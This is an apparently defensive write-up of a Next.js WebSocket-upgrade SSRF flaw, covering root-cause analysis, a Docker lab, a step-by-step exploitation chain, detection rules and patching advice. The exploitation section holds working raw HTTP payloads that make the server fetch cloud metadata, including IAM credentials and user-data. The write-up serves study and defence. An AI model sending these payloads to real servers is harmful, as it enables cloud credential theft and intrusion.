CVE-2026-44578 — Next.js WebSocket Upgrade SSRF: From Patch Analysis to Lab Design

Executive Summary

CVE-2026-44578 is a Server-Side Request Forgery (SSRF) vulnerability classified as CWE-918 in the Next.js self-hosted Node.js server runtime. It received a CVSS 3.1 score of 8.6 HIGH.

The flaw exists in the WebSocket upgrade handler and allows an unauthenticated remote attacker to make the server issue arbitrary HTTP requests to internal services — including cloud metadata endpoints — without any user interaction.

This vulnerability only affects self-hosted deployments that use the built-in next start Node.js server. Managed platforms (Vercel, Netlify) and next dev are not affected.

Vulnerability Analysis

The root cause lives in the WebSocket upgrade handler within Next.js internal router-server.ts. Under normal conditions, when Next.js proxies an incoming HTTP request via http-proxy, the response handler checks the finished and statusCode flags before completing the proxy flow. This is the safety gate that prevents open proxy behavior.

However, the WebSocket upgrade path calls proxyRequest() whenever parsedUrl contains a protocol — and it skips the finished and statusCode checks entirely.

The attack crafts a request line with a double-slash absolute URI: 

GET http:///path HTTP/1.1

The internal normalizeRepeatedSlashes function collapses http:/// down to http:/ — a protocol with no hostname. When this reaches http-proxy, the library falls back to connecting to localhost:80 while preserving the path. The resulting internal request becomes: 

GET /path HTTP/1.1
Host: localhost:80

To ensure the request reaches the vulnerable upgrade handler instead of the safe HTTP handler, the attacker adds two headers: 

Connection: Upgrade
Upgrade: websocket

These headers cause Next.js to route the request through the WebSocket upgrade code path, where the missing validation allows the forged request to complete.

Lab Architecture

To study this vulnerability safely, I built a self-contained Docker Compose lab with two containers sharing a single isolated Docker network:

  • nextjs-vuln — Next.js 15.5.0 running the vulnerable "Nimbus Analytics" app on port 3000.
  • imds-sidecar — A fake AWS IMDSv1 metadata service running on localhost:80 inside the same network namespace. This service is not reachable from the Docker host directly, proving the SSRF path.

This topology mirrors a real AWS EC2 scenario where the IMDS runs on 169.254.169.254:80 and is unreachable from the public internet but accessible from within the instance.

Exploitation Chain

The full exploitation follows four steps, moving from fingerprinting to credential extraction.

Step 1 — Server Fingerprinting

Next.js self-hosted servers expose a x-powered-by header (or similar indicators). A basic HTTP request reveals the framework and the presence of the Node.js runtime: 

curl -sI http://TARGET:3000/
# Look for x-powered-by: Next.js or x-nextjs-*

Step 2 — Enumerate the Metadata Service via SSRF

Using the WebSocket upgrade SSRF, reach the internal IMDS mock (or a real AWS metadata endpoint in production): 

GET http:///latest/meta-data/ HTTP/1.1
Host: TARGET:3000
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

The server connects to localhost:80 and returns the IMDS directory listing: ami-id, instance-id, iam/, user-data, etc.

Step 3 — Extract IAM Credentials

Enumerate the IAM role name, then request temporary credentials: 

# Discover role name
GET http:///latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: TARGET:3000
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

# Extract credentials for the role
GET http:///latest/meta-data/iam/security-credentials/ec2-role-name HTTP/1.1
Host: TARGET:3000
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

The response contains AccessKeyId, SecretAccessKey and Token — full temporary AWS credentials valid for the role's configured duration.

Step 4 — Access User-Data and Instance Identity

The same SSRF path can retrieve startup scripts and instance metadata: 

GET http:///latest/user-data HTTP/1.1
...
GET http:///latest/dynamic/instance-identity/document HTTP/1.1
...

User-data frequently contains plaintext secrets, API keys, database connection strings and deployment scripts. The instance identity document reveals account ID, instance type, region and availability zone.

Detection Signatures

Detection can be split between server-side log analysis and network-level inspection.

Server-Side Log Indicators

When the SSRF triggers, the Next.js process logs a failed proxy attempt. Look for: 

Failed to proxy http:/

This message appears in the stdout / stderr of the next start process. In production, feed this into your SIEM or log aggregation pipeline with an alert threshold.

Network-Level Indicators

At the network or WAF layer, detect requests that combine all three elements of the attack:

  1. Request line containing an absolute URI with http: or https: (e.g., GET http:///)
  2. Header Connection: Upgrade
  3. Header Upgrade: websocket

A WAF rule matching all three conditions provides a strong detection signal with minimal false positives, since legitimate traffic never combines absolute URIs in the request line with WebSocket upgrade headers.

Remediation

Immediate Fix — Update Next.js

Upgrade to a patched version as soon as possible: 

npm install next@15.5.16
# or
npm install next@16.2.5

Mitigations When Patching Is Delayed

If an immediate update is not feasible, apply these layered mitigations:

  1. Block WebSocket upgrades at the reverse proxy. If you front Next.js with nginx or a cloud load balancer, drop requests carrying Upgrade: websocket from untrusted sources.
  2. Enforce IMDSv2. On AWS, set HttpTokens=required on the instance profile. IMDSv2 requires a session token via PUT request, which cannot be obtained through a simple GET-based SSRF.
  3. Block absolute URIs in nginx. Add a rule to reject malformed request lines at the edge: 
# nginx.conf — block absolute URIs in the request line
if ($request_uri ~* "^https?://") {
    return 400;
}

This strips the attack surface before it ever reaches Next.js. It is also a sensible hardening measure regardless of this CVE, since absolute URIs in the request line are non-standard for reverse proxy configurations.
